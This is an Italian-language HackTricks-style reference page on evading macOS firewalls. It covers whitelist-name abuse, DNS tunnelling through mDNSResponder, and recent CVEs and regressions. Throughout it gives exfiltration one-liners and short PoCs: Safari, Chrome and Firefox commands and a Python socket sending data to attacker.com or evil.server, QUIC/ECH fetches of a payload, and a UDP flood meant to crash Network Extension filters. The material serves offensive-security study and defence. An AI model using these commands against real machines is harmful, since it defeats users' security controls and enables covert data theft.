# Bypass dei firewall in macOS

{{#include ../../banners/hacktricks-training.md}}

## Tecniche individuate

Le seguenti tecniche sono risultate efficaci con alcune app firewall per macOS.

### Abusare dei nomi nella whitelist

- Ad esempio, chiamare il malware con nomi di processi macOS noti, come **`launchd`**

### Synthetic Click

- Se il firewall chiede all'utente l'autorizzazione, fare in modo che il malware **faccia clic su consenti**

### **Usare binari firmati da Apple**

- Come **`curl`**, ma anche altri come **`whois`**

### Domini Apple noti

Il firewall potrebbe consentire connessioni verso domini Apple noti, come **`apple.com`** o **`icloud.com`**. Inoltre, iCloud potrebbe essere utilizzato come C2.

### Generic Bypass

Alcune idee da provare per bypassare i firewall

### Verificare il traffico consentito

Conoscere il traffico consentito aiuterà a identificare i domini potenzialmente presenti nella whitelist o quali applicazioni possono accedervi
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusare del DNS

Su macOS un processo **non** comunica direttamente con il server DNS. La risoluzione dei nomi viene gestita tramite **XPC** da **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), un demone di sistema firmato da Apple, quindi ogni lookup effettuato sulla macchina lascia l'host come traffico **proveniente da `mDNSResponder`** invece che dal processo che lo ha richiesto. Di conseguenza, i firewall tendono a considerare sempre attendibile quel demone — bloccarlo interromperebbe la risoluzione dei nomi per l'intero sistema.<sup>[[1]](#references)</sup>

Questo rende il DNS un canale che rimane aperto anche quando il firewall blocca le socket del malware:<sup>[[1]](#references)</sup>

1. Il malware prova a connettersi a `evil.com`. La sua **connessione in uscita** viene esaminata dal firewall e **bloccata**.
2. Il malware chiede invece a `mDNSResponder` di **risolvere** `evil.com`, tramite XPC.
3. Il firewall esamina la query, vede che l'origine è il resolver attendibile e firmato da Apple, e la **consente**.
4. La query raggiunge il server DNS — e se l'attacker gestisce il server autoritativo per `evil.com`, controlla entrambe le estremità dello scambio.

Poiché l'attacker possiede quella zona, non è mai necessaria alcuna "connessione": i dati vengono fatti uscire di nascosto all'interno delle **label richieste** (ad esempio `<encoded-chunk>.evil.com`) e i comandi ritornano all'interno dei **record di risposta** (TXT, A, CNAME…), secondo il classico DNS tunnelling che sfrutta un processo completamente inserito nella whitelist.

Qualsiasi processo senza privilegi può pilotare direttamente il demone: è un modo semplice per confermare che il canale è aperto:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Tramite app del browser

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Tramite process injections

Se puoi **inject code into a process** autorizzato a connettersi a qualsiasi server, potresti bypassare le protezioni del firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilità recenti di bypass del firewall di macOS (2023-2025)

### Bypass del Web content filter (Screen Time) – **CVE-2024-44206**
A luglio 2024 Apple ha corretto un bug critico in Safari/WebKit che comprometteva il “Web content filter” a livello di sistema utilizzato dai controlli parentali di Screen Time.
Un URI appositamente creato (ad esempio, con “://” sottoposto a double URL-encoding) non viene riconosciuto dall'ACL di Screen Time, ma viene accettato da WebKit; la richiesta viene quindi inviata senza filtri. Qualsiasi processo in grado di aprire un URL (incluso codice sandboxed o unsigned) può pertanto raggiungere domini esplicitamente bloccati dall'utente o da un profilo MDM.<sup>[[2]](#references)</sup>

Test pratico (sistema non patchato):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug nell'ordinamento delle regole di Packet Filter (PF) nelle prime versioni di macOS 14 “Sonoma”
Durante il ciclo beta di macOS 14, Apple ha introdotto una regressione nel wrapper userspace attorno a **`pfctl`**.
Le regole aggiunte con la keyword `quick` (utilizzata da molti kill-switch VPN) venivano ignorate silenziosamente, causando leak di traffico anche quando la GUI della VPN/firewall segnalava *bloccato*. Il bug è stato confermato da diversi vendor VPN e corretto nella RC 2 (build 23A344).<sup>[[6]](#references)</sup>

Controllo rapido delle leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abuso dei servizi helper firmati da Apple (legacy – pre-macOS 11.2)
Prima di macOS 11.2, la **`ContentFilterExclusionList`** consentiva a circa 50 binari Apple, come **`nsurlsessiond`** e l'App Store, di bypassare tutti i socket-filter firewall implementati con il framework Network Extension (LuLu, Little Snitch, ecc.).
Il malware poteva semplicemente avviare un processo escluso oppure iniettare codice al suo interno e instradare il proprio traffico attraverso il socket già consentito. Apple ha rimosso completamente l'elenco delle esclusioni in macOS 11.2, ma la tecnica è ancora rilevante sui sistemi che non possono essere aggiornati.<sup>[[3]](#references)</sup>

Esempio di proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH per eludere i filtri di dominio Network Extension (macOS 12+)
NEFilter Packet/Data Providers si basano su TLS ClientHello SNI/ALPN. Con **HTTP/3 over QUIC (UDP/443)** ed **Encrypted Client Hello (ECH)**, l'SNI rimane crittografato, NetExt non riesce ad analizzare il flow e le regole hostname spesso adottano un comportamento fail-open, consentendo al malware di raggiungere domini bloccati senza interagire con il DNS.<sup>[[5]](#references)</sup>

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Se QUIC/ECH è ancora abilitato, questo è un semplice percorso per eludere il filtro hostname.

### Instabilità della Network Extension di macOS 15 “Sequoia” (2024–2025)
Le prime build 15.0/15.1 mandano in crash i filtri **Network Extension** di terze parti (LuLu, Little Snitch, Defender, SentinelOne, ecc.). Quando il filtro si riavvia, macOS elimina le sue regole di flusso e molti prodotti adottano un comportamento fail-open. Inondare il filtro con migliaia di brevi flussi UDP (o forzare QUIC/ECH) può causare ripetutamente il crash e lasciare una finestra per C2/exfil mentre la GUI continua a indicare che il firewall è in esecuzione.<sup>[[4]](#references)</sup>

Riproduzione rapida (su una macchina di laboratorio sicura):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Suggerimenti sugli strumenti per macOS moderno

1. Ispeziona le regole PF attuali generate dai firewall con GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumera i binari che dispongono già dell'entitlement *outgoing-network* (utile per il piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registra programmaticamente il tuo content filter di Network Extension in Objective-C/Swift.
Un PoC rootless minimale che inoltra i pacchetti a un socket locale è disponibile nel source code di **LuLu** di Patrick Wardle.

## Riferimenti

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: creare e aggirare i firewall di macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Il bypass del filtro dei contenuti web di Apple consente l'accesso illimitato ai contenuti bloccati (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple rimuove una funzionalità di macOS che consentiva alle app di bypassare la sicurezza del firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [I prodotti di cybersecurity smettono di funzionare dopo l'aggiornamento a macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Usa la protezione di rete per impedire le connessioni di macOS a siti dannosi - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [Bug del firewall di macOS 14 Sonoma risolto! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
